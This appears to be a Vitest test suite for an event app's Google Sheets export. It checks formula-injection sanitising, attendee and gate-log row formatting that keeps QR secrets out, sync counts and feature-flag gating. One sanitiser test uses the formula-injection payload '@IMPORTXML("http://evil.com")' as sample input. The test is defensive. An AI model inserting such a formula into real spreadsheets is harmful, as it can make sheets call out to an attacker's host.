import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  sanitizeSheetCell,
  getGoogleSheetsSettings,
  formatRegistrationsSheetRows,
  formatTicketDistributionSheetRows,
  formatGateLogsSheetRows,
  formatSessionAttendanceSheetRows,
  executeGoogleSheetsSync,
} from '@/lib/google-sheets';
import {
  getGoogleSheetsConnectionAction,
  triggerGoogleSheetsSyncAction,
} from '@/app/actions/google-sheets';
import * as featureFlags from '@/lib/feature-flags';
import * as supabaseServer from '@/lib/supabase/server';

describe('Module 09 — Google Sheets Integration (Test 09 Suite)', () => {
  const eventId = 'evt_sheets_001';

  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('1. Spreadsheet Formula Injection Protection', () => {
    it('prepends single quote to neutralize formula injection strings', () => {
      expect(sanitizeSheetCell('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)");
      expect(sanitizeSheetCell('+123456')).toBe("'+123456");
      expect(sanitizeSheetCell('-999')).toBe("'-999");
      expect(sanitizeSheetCell('@IMPORTXML("http://evil.com")')).toBe("'@IMPORTXML(\"http://evil.com\")");
      expect(sanitizeSheetCell('\tTabPrefix')).toBe("'\tTabPrefix");
      expect(sanitizeSheetCell('Alice Smith')).toBe('Alice Smith');
      expect(sanitizeSheetCell(42)).toBe(42);
      expect(sanitizeSheetCell(true)).toBe(true);
      expect(sanitizeSheetCell(null)).toBe('');
    });
  });

  describe('2. Safe Data Formatting & Opaque QR Protection', () => {
    it('formats registration rows without exposing private QR credential hashes', () => {
      const attendees = [
        {
          id: 'att_1',
          name: 'Alice Smith',
          email: 'alice@example.com',
          phone: '+919876543210',
          ticket_tier: 'VIP Pass',
          serial_number: 'URP-001',
          checked_in: true,
          checked_in_at: '2026-10-10T10:00:00Z',
          college: 'MIT',
          department: 'Computer Science',
          created_at: '2026-10-01T12:00:00Z',
        },
      ];

      const sheetData = formatRegistrationsSheetRows(attendees);

      expect(sheetData.tab).toBe('registrations');
      expect(sheetData.headers).toContain('Attendee ID');
      expect(sheetData.headers).toContain('Full Name');
      expect(sheetData.headers).toContain('Email Address');
      expect(sheetData.headers).not.toContain('QR Token'); // QR Token NEVER exposed!
      expect(sheetData.headers).not.toContain('Credential Secret');

      expect(sheetData.rows.length).toBe(1);
      expect(sheetData.rows[0][1]).toBe('Alice Smith');
      expect(sheetData.rows[0][2]).toBe('alice@example.com');
      expect(sheetData.rows[0][4]).toBe('VIP Pass');
    });

    it('formats ticket distribution, gate logs, and session attendance tabs accurately', () => {
      const tickets = [
        {
          id: 't_1',
          order_id: 'ord_1',
          recipient_name: 'Bob Jones',
          recipient_email: 'bob@example.com',
          status: 'claimed',
          ticket_type: 'General Admission',
          assigned_at: '2026-10-02T10:00:00Z',
          claimed_at: '2026-10-02T11:00:00Z',
        },
      ];

      const distSheet = formatTicketDistributionSheetRows(tickets);
      expect(distSheet.tab).toBe('ticket_distribution');
      expect(distSheet.rows[0][2]).toBe('Bob Jones');
      expect(distSheet.rows[0][5]).toBe('CLAIMED');

      const gateScans = [
        {
          id: 'scan_1',
          attendee_name: 'Bob Jones',
          attendee_email: 'bob@example.com',
          gate_name: 'North Gate',
          operation_type: 'entry',
          scan_result: 'success',
          operator_email: 'guard@example.com',
          created_at: '2026-10-10T09:00:00Z',
        },
      ];

      const gateSheet = formatGateLogsSheetRows(gateScans);
      expect(gateSheet.tab).toBe('gate_entry_exit');
      expect(gateSheet.rows[0][3]).toBe('North Gate');
      expect(gateSheet.rows[0][4]).toBe('ENTRY');

      const sessionLogs = [
        {
          id: 'slog_1',
          session_title: 'AI Workshop',
          attendee_name: 'Bob Jones',
          attendee_email: 'bob@example.com',
          action: 'checked_in',
          duration_minutes: 45,
          created_at: '2026-10-10T11:00:00Z',
        },
      ];

      const sessionSheet = formatSessionAttendanceSheetRows(sessionLogs);
      expect(sessionSheet.tab).toBe('session_attendance');
      expect(sessionSheet.rows[0][1]).toBe('AI Workshop');
      expect(sessionSheet.rows[0][5]).toBe(45);
    });
  });

  describe('3. Sync Execution Resilience & Isolation', () => {
    it('executes sync job non-destructively and reports processed record counts', async () => {
      const syncResult = await executeGoogleSheetsSync({
        eventId,
        tabsToSync: ['registrations', 'gate_entry_exit'],
        customRows: {
          registrations: {
            tab: 'registrations',
            headers: ['ID', 'Name'],
            rows: [['att_1', 'Alice'], ['att_2', 'Bob']],
          },
          gate_entry_exit: {
            tab: 'gate_entry_exit',
            headers: ['ID', 'Gate'],
            rows: [['scan_1', 'Main Gate']],
          },
          ticket_distribution: { tab: 'ticket_distribution', headers: [], rows: [] },
          session_attendance: { tab: 'session_attendance', headers: [], rows: [] },
          analytics_summary: { tab: 'analytics_summary', headers: [], rows: [] },
        },
      });

      expect(syncResult.success).toBe(true);
      expect(syncResult.job.status).toBe('completed');
      expect(syncResult.job.recordsProcessed).toBe(3);
    });
  });

  describe('4. Feature Flag Enforcement on Server Actions', () => {
    it('blocks Google Sheets connection inspection when google_sheets is disabled', async () => {
      vi.spyOn(supabaseServer, 'createClient').mockResolvedValue({
        auth: {
          getUser: vi.fn().mockResolvedValue({ data: { user: { id: 'org_user' } } }),
        },
        from: vi.fn().mockReturnValue({
          select: vi.fn().mockReturnValue({
            eq: vi.fn().mockReturnValue({
              single: vi.fn().mockResolvedValue({
                data: {
                  id: eventId,
                  organizer_id: 'org_user',
                  custom_pass_design: null, // Disabled by default
                },
              }),
            }),
          }),
        }),
      } as any);

      const result = await getGoogleSheetsConnectionAction(eventId);
      expect(result.success).toBe(false);
      expect(result.disabled).toBe(true);
      expect(result.error).toContain('not enabled');
    });

    it('allows Google Sheets connection inspection when google_sheets is enabled', async () => {
      vi.spyOn(supabaseServer, 'createClient').mockResolvedValue({
        auth: {
          getUser: vi.fn().mockResolvedValue({ data: { user: { id: 'org_user' } } }),
        },
        from: vi.fn().mockReturnValue({
          select: vi.fn().mockReturnValue({
            eq: vi.fn().mockReturnValue({
              single: vi.fn().mockResolvedValue({
                data: {
                  id: eventId,
                  organizer_id: 'org_user',
                  custom_pass_design: {
                    _featureFlags: { features: { google_sheets: true }, version: 1 },
                    _googleSheetsConfig: {
                      enabled: true,
                      spreadsheetId: 'sheet_abc_123',
                      spreadsheetTitle: 'Tech Fest 2026 Sheet',
                    },
                  },
                },
              }),
            }),
          }),
        }),
      } as any);

      const result = await getGoogleSheetsConnectionAction(eventId);
      expect(result.success).toBe(true);
      expect(result.connection?.connected).toBe(true);
      expect(result.connection?.spreadsheetId).toBe('sheet_abc_123');
      expect(result.connection?.spreadsheetTitle).toBe('Tech Fest 2026 Sheet');
    });
  });
});
